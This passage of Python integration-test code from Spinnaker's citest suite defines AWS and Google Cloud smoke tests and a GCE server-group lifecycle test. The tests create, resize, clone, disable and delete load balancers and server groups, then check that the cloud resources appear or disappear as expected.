            'healthCheck': health_check['Target'],
            'healthCheckProtocol': 'HTTP',
            'healthCheckPort': listener['Listener']['LoadBalancerPort'],
            'healthCheckPath': '/',
            'healthTimeout': health_check['Timeout'],
            'healthInterval': health_check['Interval'],
            'healthyThreshold': health_check['HealthyThreshold'],
            'unhealthyThreshold': health_check['UnhealthyThreshold'],

            'user': '[anonymous]',
            'usePreferredZones': True,
            'vpcId': vpc_id,
            'subnetType': subnet_type,
            # If I set security group to this then I get an error it is missing.
            # bindings['TEST_AWS_SECURITY_GROUP_ID']],
            'securityGroups': security_groups
        }],
        description='Create Load Balancer: ' + load_balancer_name,
        application=self.TEST_APP)

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Load Balancer Added', retryable_for_secs=10)
     .collect_resources(
         aws_module='elb',
         command='describe-load-balancers',
         args=['--load-balancer-names', load_balancer_name])
     .contains_pred_list([
         jc.PathContainsPredicate(                    
             'LoadBalancerDescriptions/HealthCheck', health_check),
         jc.PathPredicate(                    
             'LoadBalancerDescriptions/AvailabilityZones',                    
             jc.LIST_SIMILAR(expect_avail_zones)),                    
         jc.PathElementsContainPredicate(                    
             'LoadBalancerDescriptions/ListenerDescriptions', listener)
         ])
    )

    title_decorator = '_with_vpc' if use_vpc else '_without_vpc'
    return st.OperationContract(
        self.new_post_operation(
            title='upsert_load_balancer' + title_decorator,
            data=payload,
            path='tasks'),
        contract=builder.build())

  def delete_load_balancer(self, use_vpc):
    """Creates OperationContract for deleteLoadBalancer.

    To verify the operation, we just check that the AWS resources
    created by upsert_load_balancer are no longer visible on AWS.

    Args:
      use_vpc: [bool] if True delete the VPC load balancer, otherwise
         the non-VPC load balancer.
    """
    load_balancer_name = self.bindings['TEST_APP_COMPONENT_NAME']
    if not use_vpc:
      # This is the second load balancer, where we decorated the name in upsert.
      load_balancer_name += '-pub'

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'type': 'deleteLoadBalancer',
            'cloudProvider': 'aws',

            'credentials': self.bindings['AWS_CREDENTIALS'],
            'regions': [self.bindings['TEST_AWS_REGION']],
            'loadBalancerName': load_balancer_name
        }],
        description='Delete Load Balancer: {0} in {1}:{2}'.format(
            load_balancer_name,
            self.bindings['AWS_CREDENTIALS'],
            self.bindings['TEST_AWS_REGION']),
        application=self.TEST_APP)

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Load Balancer Removed')
     .collect_resources(
         aws_module='elb',
         command='describe-load-balancers',
         args=['--load-balancer-names', load_balancer_name],
         no_resources_ok=True)
     .excludes_path_value('LoadBalancerName', load_balancer_name))

    title_decorator = '_with_vpc' if use_vpc else '_without_vpc'
    return st.OperationContract(
        self.new_post_operation(
            title='delete_load_balancer' + title_decorator,
            data=payload,
            path='tasks'),
        contract=builder.build())

  def create_server_group(self):
    """Creates OperationContract for createServerGroup.

    To verify the operation, we just check that the AWS Auto Scaling Group
    for the server group was created.
    """
    bindings = self.bindings
    load_balancer_name = bindings['TEST_APP_COMPONENT_NAME']

    # Spinnaker determines the group name created,
    # which will be the following:
    group_name = '{app}-{stack}-v000'.format(
        app=self.TEST_APP, stack=bindings['TEST_STACK'])

    region = bindings['TEST_AWS_REGION']
    avail_zones = [region + 'a', region + 'b']

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'type': 'createServerGroup',
            'cloudProvider': 'aws',
            'application': self.TEST_APP,
            'credentials': bindings['AWS_CREDENTIALS'],
            'strategy':'',
            'capacity': {'min':2, 'max':2, 'desired':2},
            'targetHealthyDeployPercentage': 100,
            'loadBalancers': [load_balancer_name],
            'cooldown': 8,
            'healthCheckType': 'EC2',
            'healthCheckGracePeriod': 40,
            'instanceMonitoring': False,
            'ebsOptimized': False,
            'iamRole': bindings['AWS_IAM_ROLE'],
            'terminationPolicies': ['Default'],

            'availabilityZones': {region: avail_zones},
            'keyPair': bindings['AWS_CREDENTIALS'] + '-keypair',
            'suspendedProcesses': [],
            # TODO(ewiseblatt): Inquiring about how this value is determined.
            # It seems to be the "Name" tag value of one of the VPCs
            # but is not the default VPC, which is what we using as the VPC_ID.
            # So I suspect something is out of whack. This name comes from
            # spinnaker.io tutorial. But using the default vpc would probably
            # be more adaptive to the particular deployment.
            'subnetType': 'internal (defaultvpc)',
            'securityGroups': [bindings['TEST_AWS_SECURITY_GROUP_ID']],
            'virtualizationType': 'paravirtual',
            'stack': bindings['TEST_STACK'],
            'freeFormDetails': '',
            'amiName': bindings['TEST_AWS_AMI'],
            'instanceType': 'm1.small',
            'useSourceCapacity': False,
            'account': bindings['AWS_CREDENTIALS'],
            'user': '[anonymous]'
        }],
        description='Create Server Group in ' + group_name,
        application=self.TEST_APP)

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Auto Server Group Added',
                                retryable_for_secs=30)
     .collect_resources('autoscaling', 'describe-auto-scaling-groups',
                        args=['--auto-scaling-group-names', group_name])
     .contains_path_value('AutoScalingGroups', {'MaxSize': 2}))

    return st.OperationContract(
        self.new_post_operation(
            title='create_server_group', data=payload, path='tasks'),
        contract=builder.build())

  def delete_server_group(self):
    """Creates OperationContract for deleteServerGroup.

    To verify the operation, we just check that the AWS Auto Scaling Group
    is no longer visible on AWS (or is in the process of terminating).
    """
    bindings = self.bindings
    group_name = '{app}-{stack}-v000'.format(
        app=self.TEST_APP, stack=bindings['TEST_STACK'])

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'cloudProvider': 'aws',
            'type': 'destroyServerGroup',
            'serverGroupName': group_name,
            'asgName': group_name,
            'region': bindings['TEST_AWS_REGION'],
            'regions': [bindings['TEST_AWS_REGION']],
            'credentials': bindings['AWS_CREDENTIALS'],
            'user': '[anonymous]'
        }],
        application=self.TEST_APP,
        description='DestroyServerGroup: ' + group_name)

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Auto Scaling Group Removed')
     .collect_resources('autoscaling', 'describe-auto-scaling-groups',
                        args=['--auto-scaling-group-names', group_name],
                        no_resources_ok=True)
     .contains_path_value('AutoScalingGroups', {'MaxSize': 0}))

    (builder.new_clause_builder('Instances Are Removed',
                                retryable_for_secs=30)
     .collect_resources('ec2', 'describe-instances', no_resources_ok=True)
     .excludes_path_value('name', group_name))

    return st.OperationContract(
        self.new_post_operation(
            title='delete_server_group', data=payload, path='tasks'),
        contract=builder.build())


class AwsSmokeTest(st.AgentTestCase):
  """The test fixture for the SmokeTest.

  This is implemented using citest OperationContract instances that are
  created by the AwsSmokeTestScenario.
  """
  # pylint: disable=missing-docstring

  def test_a_create_app(self):
    self.run_test_case(self.scenario.create_app())

  def test_b_upsert_load_balancer_public(self):
    self.run_test_case(self.scenario.upsert_load_balancer(use_vpc=False))

  def test_b_upsert_load_balancer_vpc(self):
    self.run_test_case(self.scenario.upsert_load_balancer(use_vpc=True))

  def test_c_create_server_group(self):
    # We'll permit this to timeout for now
    # because it might be waiting on confirmation
    # but we'll continue anyway because side effects
    # should have still taken place.
    self.run_test_case(self.scenario.create_server_group(), timeout_ok=True)

  def test_x_delete_server_group(self):
    self.run_test_case(self.scenario.delete_server_group(), max_retries=5)

  def test_y_delete_load_balancer_vpc(self):
    self.run_test_case(self.scenario.delete_load_balancer(use_vpc=True),
                       max_retries=5)

  def test_y_delete_load_balancer_pub(self):
    self.run_test_case(self.scenario.delete_load_balancer(use_vpc=False),
                       max_retries=5)

  def test_z_delete_app(self):
    # Give a total of a minute because it might also need
    # an internal cache update
    self.run_test_case(self.scenario.delete_app(),
                       retry_interval_secs=8, max_retries=8)


def main():
  """Implements the main method running this smoke test."""

  defaults = {
      'TEST_STACK': str(AwsSmokeTestScenario.DEFAULT_TEST_ID),
      'TEST_APP': 'smoketest' + AwsSmokeTestScenario.DEFAULT_TEST_ID
  }

  return st.ScenarioTestRunner.main(
      AwsSmokeTestScenario,
      default_binding_overrides=defaults,
      test_case_list=[AwsSmokeTest])


if __name__ == '__main__':
  sys.exit(main())


# Standard python modules.
import time
import sys

# citest modules.
import citest.gcp_testing as gcp
import citest.json_contract as jc                    
import citest.service_testing as st

# Spinnaker modules.
import spinnaker_testing as sk
import spinnaker_testing.gate as gate


class GoogleServerGroupTestScenario(sk.SpinnakerTestScenario):

  @classmethod
  def new_agent(cls, bindings):
    '''Implements the base class interface to create a new agent.

    This method is called by the base classes during setup/initialization.

    Args:
      bindings: The bindings dictionary with configuration information
        that this factory can draw from to initialize. If the factory would
        like additional custom bindings it could add them to initArgumentParser.

    Returns:
      A citest.service_testing.BaseAgent that can interact with Gate.
      This is the agent that test operations will be posted to.
    '''
    return gate.new_agent(bindings)

  def __init__(self, bindings, agent=None):
    super(GoogleServerGroupTestScenario, self).__init__(bindings, agent)

    # Our application name and path to post events to.
    self.TEST_APP = bindings['TEST_APP']
    self.__path = 'applications/%s/tasks' % self.TEST_APP

    # The spinnaker stack decorator for our resources.
    self.TEST_STACK = bindings['TEST_STACK']

    self.TEST_REGION = bindings['TEST_GCE_REGION']
    self.TEST_ZONE = bindings['TEST_GCE_ZONE']

    # Resource names used among tests.
    self.__cluster_name = '%s-%s' % (self.TEST_APP, self.TEST_STACK)
    self.__server_group_name = '%s-v000' % self.__cluster_name
    self.__cloned_server_group_name = '%s-v001' % self.__cluster_name
    self.__lb_name = '%s-%s-fe' % (self.TEST_APP, self.TEST_STACK)

  def create_load_balancer(self):
    job = [{
      'cloudProvider': 'gce',
      'loadBalancerName': self.__lb_name,
      'ipProtocol': 'TCP',
      'portRange': '8080',
      'provider': 'gce',
      'stack': self.TEST_STACK,
      'detail': 'frontend',
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'region': self.TEST_REGION,
      'listeners': [{
        'protocol': 'TCP',
        'portRange': '8080',
        'healthCheck': False
      }],
      'name': self.__lb_name,
      'type': 'upsertLoadBalancer',
      'availabilityZones': {self.TEST_REGION: []},
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Load Balancer Created', retryable_for_secs=30)
     .list_resources('forwarding-rules')
     .contains_path_value('name', self.__lb_name))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - create load balancer',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='create_load_balancer', data=payload, path=self.__path),
      contract=builder.build())

  def create_instances(self):
    job = [{
      'application': self.TEST_APP,
      'stack': self.TEST_STACK,
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'zone': self.TEST_ZONE,
      'network': 'default',
      'targetSize': 1,
      'capacity': {
        'min': 1,
        'max': 1,
        'desired': 1
      },
      'availabilityZones': {
        self.TEST_REGION: [self.TEST_ZONE]
      },
      'loadBalancers': [self.__lb_name],
      'instanceMetadata': {
        'load-balancer-names': self.__lb_name
      },
      'cloudProvider': 'gce',
      'image': self.bindings['TEST_GCE_IMAGE_NAME'],
      'instanceType': 'f1-micro',
      'initialNumReplicas': 1,
      'type': 'createServerGroup',
      'account': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Instance Created', retryable_for_secs=150)
     .list_resources('instance-groups')
     .contains_path_value('name', self.__server_group_name))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job,
        description='Server Group Test - create initial server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='create_instances', data=payload, path=self.__path),
      contract=builder.build())

  def resize_server_group(self):
    job = [{
      'targetSize': 2,
      'capacity': {
        'min': 2,
        'max': 2,
        'desired': 2
      },
      'replicaPoolName': self.__server_group_name,
      'numReplicas': 2,
      'region': self.TEST_REGION,
      'zone': self.TEST_ZONE,
      'asgName': self.__server_group_name,
      'type': 'resizeServerGroup',
      'regions': [self.TEST_REGION],
      'zones': [self.TEST_ZONE],
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'cloudProvider': 'gce',
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Resized', retryable_for_secs=90)
     .inspect_resource('instance-groups',
                       self.__server_group_name,
                       ['--zone', self.TEST_ZONE])
     .contains_path_eq('size', 2))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - resize to 2 instances',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='resize_instances', data=payload, path=self.__path),
      contract=builder.build())

  def clone_server_group(self):
    job = [{
      'application': self.TEST_APP,
      'stack': self.TEST_STACK,
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'loadBalancers': [self.__lb_name],
      'targetSize': 1,
      'capacity': {
        'min': 1,
        'max': 1,
        'desired': 1
      },
      'zone': self.TEST_ZONE,
      'network': 'default',
      'instanceMetadata': {'load-balancer-names': self.__lb_name},
      'availabilityZones': {self.TEST_REGION: [self.TEST_ZONE]},
      'cloudProvider': 'gce',
      'source': {
        'account': self.bindings['GCE_CREDENTIALS'],
        'region': self.TEST_REGION,
        'zone': self.TEST_ZONE,
        'serverGroupName': self.__server_group_name,
        'asgName': self.__server_group_name
      },
      'instanceType': 'f1-micro',
      'image': self.bindings['TEST_GCE_IMAGE_NAME'],
      'initialNumReplicas': 1,
      'loadBalancers': [self.__lb_name],
      'type': 'cloneServerGroup',
      'account': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Cloned', retryable_for_secs=90)
     .list_resources('managed-instance-groups')
     .contains_path_value('baseInstanceName', self.__cloned_server_group_name))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - clone server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='clone_server_group', data=payload, path=self.__path),
      contract=builder.build())

  def disable_server_group(self):
    job = [{
      'cloudProvider': 'gce',
      'asgName': self.__server_group_name,
      'serverGroupName': self.__server_group_name,
      'region': self.TEST_REGION,
      'zone': self.TEST_ZONE,
      'type': 'disableServerGroup',
      'regions': [self.TEST_REGION],
      'zones': [self.TEST_ZONE],
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Disabled', retryable_for_secs=90)
     .list_resources('managed-instance-groups')
     .contains_path_value('baseInstanceName', self.__server_group_name)
     .excludes_pred_list([
         jc.PathContainsPredicate('baseInstanceName', self.__server_group_name),                    
         jc.PathContainsPredicate('targetPools', 'https')]))                    

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - disable server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='disable_server_group', data=payload, path=self.__path),
      contract=builder.build())

  def enable_server_group(self):
    job = [{
      'cloudProvider': 'gce',
      'asgName': self.__server_group_name,
      'serverGroupName': self.__server_group_name,
      'region': self.TEST_REGION,
      'zone': self.TEST_ZONE,
      'type': 'enableServerGroup',
      'regions': [self.TEST_REGION],
      'zones': [self.TEST_ZONE],
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Enabled', retryable_for_secs=90)
     .list_resources('managed-instance-groups')
     .contains_pred_list([
         jc.PathContainsPredicate('baseInstanceName', self.__server_group_name),                    
         jc.PathContainsPredicate('targetPools', 'https')]))                    

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - enable server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='enable_server_group', data=payload, path=self.__path),
      contract=builder.build())

  def destroy_server_group(self, version):
    serverGroupName = '%s-%s' % (self.__cluster_name, version)
    job = [{
      'cloudProvider': 'gce',
      'asgName': serverGroupName,
      'serverGroupName': serverGroupName,
      'region': self.TEST_REGION,
      'zone': self.TEST_ZONE,
      'type': 'destroyServerGroup',
      'regions': [self.TEST_REGION],
      'zones': [self.TEST_ZONE],
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Destroyed', retryable_for_secs=90)
     .list_resources('managed-instance-groups')
     .excludes_path_value('baseInstanceName', serverGroupName))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - destroy server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='destroy_server_group', data=payload, path=self.__path),
      contract=builder.build())

  def delete_load_balancer(self):
    job = [{
      "loadBalancerName": self.__lb_name,
      "networkLoadBalancerName": self.__lb_name,
      "region": "us-central1",
      "type": "deleteLoadBalancer",
      "regions": ["us-central1"],
      "credentials": self.bindings['GCE_CREDENTIALS'],
      "cloudProvider": "gce",
      "user": "integration-tests"
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Load Balancer Created', retryable_for_secs=30)
     .list_resources('forwarding-rules')
     .excludes_path_value('name', self.__lb_name))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - delete load balancer',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='delete_load_balancer', data=payload, path=self.__path),
      contract=builder.build())


class GoogleServerGroupTest(st.AgentTestCase):
  def test_a_create_load_balancer(self):
    self.run_test_case(self.scenario.create_load_balancer())

  def test_b_create_server_group(self):
    self.run_test_case(self.scenario.create_instances())

  def test_c_resize_server_group(self):
    self.run_test_case(self.scenario.resize_server_group())

  def test_d_clone_server_group(self):
    self.run_test_case(self.scenario.clone_server_group(),
                       # TODO(ewiseblatt): 20160314
                       # There is a lock contention race condition
                       # in clouddriver that causes intermittent failure.
                       max_retries=5)

  def test_e_disable_server_group(self):
    self.run_test_case(self.scenario.disable_server_group())

  def test_f_enable_server_group(self):
    self.run_test_case(self.scenario.enable_server_group())

  def test_g_destroy_server_group_v000(self):
    self.run_test_case(self.scenario.destroy_server_group('v000'))

  def test_h_destroy_server_group_v001(self):
    self.run_test_case(self.scenario.destroy_server_group('v001'))

  def test_z_delete_load_balancer(self):
    self.run_test_case(self.scenario.delete_load_balancer())


def main():

  defaults = {
    'TEST_STACK': GoogleServerGroupTestScenario.DEFAULT_TEST_ID,
    'TEST_APP': 'gcpsvrgrptst' + GoogleServerGroupTestScenario.DEFAULT_TEST_ID
  }

  return st.ScenarioTestRunner.main(
      GoogleServerGroupTestScenario,
      default_binding_overrides=defaults,
      test_case_list=[GoogleServerGroupTest])


if __name__ == '__main__':
  sys.exit(main())

# Copyright 2015 Google Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
Smoke test to see if Spinnaker can interoperate with Google Cloud Platform.

See testable_service/integration_test.py and spinnaker_testing/spinnaker.py
for more details.

The smoke test will use ssh to peek at the spinnaker configuration
to determine the managed project it should verify, and to determine
the spinnaker account name to use when sending it commands.

Sample Usage:
    Assuming you have created $PASSPHRASE_FILE (which you should chmod 400)
    and $CITEST_ROOT points to the root directory of this repository
    (which is . if you execute this from the root)

  PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
    python $CITEST_ROOT/spinnaker/spinnaker_system/google_smoke_test.py \
    --gce_ssh_passphrase_file=$PASSPHRASE_FILE \
    --gce_project=$PROJECT \
    --gce_zone=$ZONE \
    --gce_instance=$INSTANCE
or
  PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
    python $CITEST_ROOT/spinnaker/spinnaker_system/google_smoke_test.py \
    --native_hostname=host-running-smoke-test
    --managed_gce_project=$PROJECT \
    --test_gce_zone=$ZONE
"""

# Standard python modules.
import sys

# citest modules.
import citest.gcp_testing as gcp
import citest.json_contract as jc
import citest.service_testing as st

# Spinnaker modules.
import spinnaker_testing as sk
import spinnaker_testing.gate as gate


class GoogleSmokeTestScenario(sk.SpinnakerTestScenario):
  """Defines the scenario for the smoke test.

  This scenario defines the different test operations.
  We're going to:
    Create a Spinnaker Application
    Create a Load Balancer
    Create a Server Group
    Delete each of the above (in reverse order)
  """

  @classmethod
  def new_agent(cls, bindings):
    """Implements citest.service_testing.AgentTestScenario.new_agent."""
    return gate.new_agent(bindings)

  @classmethod
  def initArgumentParser(cls, parser, defaults=None):
    """Initialize command line argument parser.

    Args:
      parser: argparse.ArgumentParser
    """
    super(GoogleSmokeTestScenario, cls).initArgumentParser(parser, defaults=defaults)

    defaults = defaults or {}
    parser.add_argument(
        '--test_component_detail',
        default='fe',
        help='Refinement for component name to create.')

  def __init__(self, bindings, agent=None):
    """Constructor.

    Args:
      bindings: [dict] The data bindings to use to configure the scenario.
      agent: [GateAgent] The agent for invoking the test operations on Gate.
    """
    super(GoogleSmokeTestScenario, self).__init__(bindings, agent)

    bindings = self.bindings
    bindings['TEST_APP_COMPONENT_NAME'] = (
        '{app}-{stack}-{detail}'.format(
            app=bindings['TEST_APP'],
            stack=bindings['TEST_STACK'],
            detail=bindings['TEST_COMPONENT_DETAIL']))

    # We'll call out the app name because it is widely used
    # because it scopes the context of our activities.
    # pylint: disable=invalid-name
    self.TEST_APP = bindings['TEST_APP']

  def create_app(self):
    """Creates OperationContract that creates a new Spinnaker Application."""
    contract = jc.Contract()
    return st.OperationContract(
        self.agent.make_create_app_operation(
            bindings=self.bindings, application=self.TEST_APP),
        contract=contract)

  def delete_app(self):
    """Creates OperationContract that deletes a new Spinnaker Application."""
    contract = jc.Contract()
    return st.OperationContract(
        self.agent.make_delete_app_operation(
            bindings=self.bindings, application=self.TEST_APP),
        contract=contract)

  def upsert_load_balancer(self):
    """Creates OperationContract for upsertLoadBalancer.

    Calls Spinnaker's upsertLoadBalancer with a configuration, then verifies
    that the expected resources and configurations are visible on GCE. See
    the contract builder for more info on what the expectations are.
    """
    bindings = self.bindings
    load_balancer_name = bindings['TEST_APP_COMPONENT_NAME']
    target_pool_name = '{0}/targetPools/{1}-tp'.format(
        bindings['TEST_GCE_REGION'], load_balancer_name)

    spec = {
        'checkIntervalSec': 9,
        'healthyThreshold': 3,
        'unhealthyThreshold': 5,
        'timeoutSec': 2,
        'port': 80
    }

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'cloudProvider': 'gce',
            'provider': 'gce',
            'stack': bindings['TEST_STACK'],
            'detail': bindings['TEST_COMPONENT_DETAIL'],
            'credentials': bindings['GCE_CREDENTIALS'],
            'region': bindings['TEST_GCE_REGION'],
            'ipProtocol': 'TCP',
            'portRange': spec['port'],
            'loadBalancerName': load_balancer_name,
            'healthCheck': {
                'port': spec['port'],
                'timeoutSec': spec['timeoutSec'],
                'checkIntervalSec': spec['checkIntervalSec'],
                'healthyThreshold': spec['healthyThreshold'],
                'unhealthyThreshold': spec['unhealthyThreshold'],
            },
            'type': 'upsertLoadBalancer',
            'availabilityZones': {bindings['TEST_GCE_REGION']: []},
            'user': '[anonymous]'
        }],
        description='Create Load Balancer: ' + load_balancer_name,
        application=self.TEST_APP)

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Health Check Added',
                                retryable_for_secs=30)
     .list_resources('http-health-checks')
     .contains_pred_list(
         [jc.PathContainsPredicate('name', '%s-hc' % load_balancer_name),                    
          jc.DICT_SUBSET(spec)]))                    
    (builder.new_clause_builder('Target Pool Added',
                                retryable_for_secs=30)
     .list_resources('target-pools')
     .contains_path_value('name', '%s-tp' % load_balancer_name))
    (builder.new_clause_builder('Forwarding Rules Added',
                                retryable_for_secs=30)
     .list_resources('forwarding-rules')
     .contains_pred_list([
          jc.PathContainsPredicate('name', load_balancer_name),                    
          jc.PathContainsPredicate('target', target_pool_name)]))                    

    return st.OperationContract(
        self.new_post_operation(
            title='upsert_load_balancer', data=payload, path='tasks'),
        contract=builder.build())

  def delete_load_balancer(self):
    """Creates OperationContract for deleteLoadBalancer.

    To verify the operation, we just check that the GCP resources
    created by upsert_load_balancer are no longer visible on GCP.
    """
    load_balancer_name = self.bindings['TEST_APP_COMPONENT_NAME']
    bindings = self.bindings
    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'type': 'deleteLoadBalancer',
            'cloudProvider': 'gce',
            'loadBalancerName': load_balancer_name,
            'region': bindings['TEST_GCE_REGION'],
            'regions': [bindings['TEST_GCE_REGION']],
            'credentials': bindings['GCE_CREDENTIALS'],
            'user': '[anonymous]'
        }],
        description='Delete Load Balancer: {0} in {1}:{2}'.format(
            load_balancer_name,
            bindings['GCE_CREDENTIALS'],
            bindings['TEST_GCE_REGION']),
        application=self.TEST_APP)

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Health Check Removed', retryable_for_secs=30)
     .list_resources('http-health-checks')
     .excludes_path_value('name', '%s-hc' % load_balancer_name))
    (builder.new_clause_builder('TargetPool Removed')
     .list_resources('target-pools')
     .excludes_path_value('name', '%s-tp' % load_balancer_name))
    (builder.new_clause_builder('Forwarding Rule Removed')
     .list_resources('forwarding-rules')
     .excludes_path_value('name', load_balancer_name))

    return st.OperationContract(
        self.new_post_operation(
            title='delete_load_balancer', data=payload, path='tasks'),
        contract=builder.build())

  def create_server_group(self):
    """Creates OperationContract for createServerGroup.

    To verify the operation, we just check that Managed Instance Group
    for the server was created.
    """
    bindings = self.bindings

    # Spinnaker determines the group name created,
    # which will be the following:
    group_name = '{app}-{stack}-v000'.format(
        app=self.TEST_APP, stack=bindings['TEST_STACK'])

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'cloudProvider': 'gce',
            'application': self.TEST_APP,
            'credentials': bindings['GCE_CREDENTIALS'],
            'strategy':'',
            'capacity': {'min':2, 'max':2, 'desired':2},
            'targetSize': 2,
            'image': bindings['TEST_GCE_IMAGE_NAME'],
            'zone': bindings['TEST_GCE_ZONE'],
            'stack': bindings['TEST_STACK'],
            'instanceType': 'f1-micro',
            'type': 'createServerGroup',
            'loadBalancers': [bindings['TEST_APP_COMPONENT_NAME']],
            'availabilityZones': {
                bindings['TEST_GCE_REGION']: [bindings['TEST_GCE_ZONE']]
            },
            'instanceMetadata': {
                'startup-script': ('sudo apt-get update'
                                   ' && sudo apt-get install apache2 -y'),
                'load-balancer-names': bindings['TEST_APP_COMPONENT_NAME']
            },
            'account': bindings['GCE_CREDENTIALS'],
            'authScopes': ['compute'],
            'user': '[anonymous]'
        }],
        description='Create Server Group in ' + group_name,
        application=self.TEST_APP)

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Managed Instance Group Added',
                                retryable_for_secs=30)
     .inspect_resource('managed-instance-groups', group_name)
     .contains_path_eq('targetSize', 2))

    return st.OperationContract(
        self.new_post_operation(
            title='create_server_group', data=payload, path='tasks'),
        contract=builder.build())

  def delete_server_group(self):
    """Creates OperationContract for deleteServerGroup.

    To verify the operation, we just check that the GCP managed instance group
    is no longer visible on GCP (or is in the process of terminating).
    """
    bindings = self.bindings
    group_name = '{app}-{stack}-v000'.format(
        app=self.TEST_APP, stack=bindings['TEST_STACK'])

    # TODO(ttomsu): Change this back from asgName to serverGroupName
    #               once it is fixed in orca.
    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'cloudProvider': 'gce',
            'serverGroupName': group_name,
            'region': bindings['TEST_GCE_REGION'],
            'zone': bindings['TEST_GCE_ZONE'],
            'asgName': group_name,
            'type': 'destroyServerGroup',
            'regions': [bindings['TEST_GCE_REGION']],
            'zones': [bindings['TEST_GCE_ZONE']],
            'credentials': bindings['GCE_CREDENTIALS'],
            'user': '[anonymous]'
        }],
        application=self.TEST_APP,
        description='DestroyServerGroup: ' + group_name)

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Managed Instance Group Removed')
     .inspect_resource('managed-instance-groups', group_name,
                       no_resource_ok=True)
     .contains_path_eq('targetSize', 0))

    (builder.new_clause_builder('Instances Are Removed',
                                retryable_for_secs=30)
     .list_resources('instances')
     .excludes_path_value('name', group_name))

    return st.OperationContract(
        self.new_post_operation(
            title='delete_server_group', data=payload, path='tasks'),
        contract=builder.build())


class GoogleSmokeTest(st.AgentTestCase):
  """The test fixture for the SmokeTest.

  This is implemented using citest OperationContract instances that are
  created by the GoogleSmokeTestScenario.
  """
  # pylint: disable=missing-docstring

  def test_a_create_app(self):
    self.run_test_case(self.scenario.create_app())

  def test_b_upsert_load_balancer(self):
    self.run_test_case(self.scenario.upsert_load_balancer())

  def test_c_create_server_group(self):
    # We'll permit this to timeout for now
    # because it might be waiting on confirmation
    # but we'll continue anyway because side effects
    # should have still taken place.
    self.run_test_case(self.scenario.create_server_group(), timeout_ok=True)

  def test_x_delete_server_group(self):
    self.run_test_case(self.scenario.delete_server_group(), max_retries=5)

  def test_y_delete_load_balancer(self):
    self.run_test_case(self.scenario.delete_load_balancer(),
                       max_retries=5)

  def test_z_delete_app(self):
    # Give a total of a minute because it might also need
    # an internal cache update
    self.run_test_case(self.scenario.delete_app(),
                       retry_interval_secs=8, max_retries=8)


def main():
  """Implements the main method running this smoke test."""

  defaults = {
      'TEST_STACK': str(GoogleSmokeTestScenario.DEFAULT_TEST_ID),
      'TEST_APP': 'gcpsmoketest' + GoogleSmokeTestScenario.DEFAULT_TEST_ID
  }

  return st.ScenarioTestRunner.main(
      GoogleSmokeTestScenario,
      default_binding_overrides=defaults,
      test_case_list=[GoogleSmokeTest])


if __name__ == '__main__':
  sys.exit(main())

